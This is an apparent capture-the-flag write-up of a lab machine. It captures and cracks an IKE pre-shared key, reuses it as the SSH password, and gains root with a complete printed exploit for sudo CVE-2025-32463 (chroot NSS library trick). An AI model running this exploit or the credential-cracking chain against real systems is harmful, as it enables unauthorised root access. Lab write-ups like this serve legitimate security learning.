Intial Enumeration
```
┌──(lotus㉿lotus-pc)-[~/expressway]
└─$ sudo nmap -A 10.10.11.87                      
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-21 13:44 EDT
Nmap scan report for 10.10.11.87
Host is up (0.038s latency).
Not shown: 999 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 10.0p2 Debian 8 (protocol 2.0)
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.19
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 80/tcp)
HOP RTT      ADDRESS
1   41.36 ms 10.10.14.1
2   42.20 ms 10.10.11.87

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 3.89 seconds
```

```
┌──(lotus㉿lotus-pc)-[~/expressway]
└─$ sudo nmap -sU --top-ports 100 --min-rate 1000 10.10.11.87 -oN udp_fast.txt

[sudo] password for lotus: 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-21 13:48 EDT
Nmap scan report for 10.10.11.87
Host is up (0.038s latency).
Not shown: 95 open|filtered udp ports (no-response)
PORT      STATE  SERVICE
500/udp   open   isakmp
626/udp   closed serialnumberd
997/udp   closed maitrd
1022/udp  closed exp2
49190/udp closed unknown

Nmap done: 1 IP address (1 host up) scanned in 0.49 seconds

```

User.txt
```
sudo ike-scan -M 10.10.11.87
```
```
sudo ike-scan -M -A 10.10.11.87

Starting ike-scan 1.9.6 with 1 hosts (http://www.nta-monitor.com/tools/ike-scan/)
10.10.11.87     Aggressive Mode Handshake returned
        HDR=(CKY-R=38af9c1cc281ea3b)
        SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK LifeType=Seconds LifeDuration=28800)
        KeyExchange(128 bytes)
        Nonce(32 bytes)
        ID(Type=ID_USER_FQDN, Value=ike@expressway.htb)
        VID=09002689dfd6b712 (XAUTH)
        VID=afcad71368a1f1c96b8696fc77570100 (Dead Peer Detection v1.0)
        Hash(20 bytes)

Ending ike-scan 1.9.6: 1 hosts scanned in 0.050 seconds (19.83 hosts/sec).  1 returned handshake; 0 returned notify

```

```
sudo ike-scan -M -A --pskcrack=hashes.txt 10.10.11.87

Starting ike-scan 1.9.6 with 1 hosts (http://www.nta-monitor.com/tools/ike-scan/)
10.10.11.87     Aggressive Mode Handshake returned
        HDR=(CKY-R=33c27dac5cfaa9f9)
        SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK LifeType=Seconds LifeDuration=28800)
        KeyExchange(128 bytes)
        Nonce(32 bytes)
        ID(Type=ID_USER_FQDN, Value=ike@expressway.htb)
        VID=09002689dfd6b712 (XAUTH)
        VID=afcad71368a1f1c96b8696fc77570100 (Dead Peer Detection v1.0)
        Hash(20 bytes)

Ending ike-scan 1.9.6: 1 hosts scanned in 0.050 seconds (20.02 hosts/sec).  1 returned handshake; 0 returned notify
```

```
sk-crack -d /usr/share/wordlists/rockyou.txt hashes.txt

Starting psk-crack [ike-scan 1.9.6] (http://www.nta-monitor.com/tools/ike-scan/)
Running in dictionary cracking mode
key "freakingrockstarontheroad" matches SHA1 hash d2ab68e2edc85b78c702b27e220949ee07cc4acb
Ending psk-crack: 8045040 iterations in 14.919 seconds (539252.42 iterations/sec)
```

SSH using the `freakingrockstarontheroad` key for the password.
```
ssh ike@10.10.11.87

ike@10.10.11.87's password: 
Permission denied, please try again.
ike@10.10.11.87's password: 
Last login: Sun Sep 21 19:07:20 BST 2025 from 10.10.14.63 on ssh
Linux expressway.htb 6.16.7+deb14-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.16.7-1 (2025-09-11) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Sun Sep 21 19:08:51 2025 from 10.10.14.222
ike@expressway:~$ 
```

<img width="334" height="119" alt="image" src="https://github.com/user-attachments/assets/ad6205a2-fa9c-41a3-b09d-4a365a409421" />

Root.txt

```
ike@expressway:~$ sudo -V
Sudo version 1.9.17
Sudoers policy plugin version 1.9.17
Sudoers file grammar version 50
Sudoers I/O plugin version 1.9.17
Sudoers audit plugin version 1.9.17
ike@expressway:~$ 
```
sudo version 1.9.17 is vulnerable CVE-2025-32463
https://github.com/junxian428/CVE-2025-32463


```
ike@expressway:~$ nano priv_esc.sh
```
```
#!/bin/bash
# sudo-chwoot.sh
# CVE-2025-32463 – Sudo EoP Exploit PoC by Rich Mirch
#                  @ Stratascale Cyber Research Unit (CRU)
STAGE=$(mktemp -d /tmp/sudowoot.stage.XXXXXX)
cd ${STAGE?} || exit 1

cat > woot1337.c<<EOF
#include <stdlib.h>
#include <unistd.h>
__attribute__((constructor)) void woot(void) {
  setreuid(0,0);
  setregid(0,0);
  chdir("/");
  execl("/bin/bash", "/bin/bash", NULL);
}
EOF

mkdir -p woot/etc libnss_
echo "passwd: /woot1337" > woot/etc/nsswitch.conf
cp /etc/group woot/etc
gcc -shared -fPIC -Wl,-init,woot -o libnss_/woot1337.so.2 woot1337.c

echo "woot!"
sudo -R woot woot
rm -rf ${STAGE?}
```

```
ike@expressway:~$ chmod +x priv_esc.sh
```

```
ike@expressway:~$ chmod +x priv_esc.sh 
ike@expressway:~$ ./priv_esc.sh 
woot!
root@expressway:/# 
```

<img width="483" height="75" alt="image" src="https://github.com/user-attachments/assets/1aff72a1-7505-42ed-b219-71fa2574fb03" />




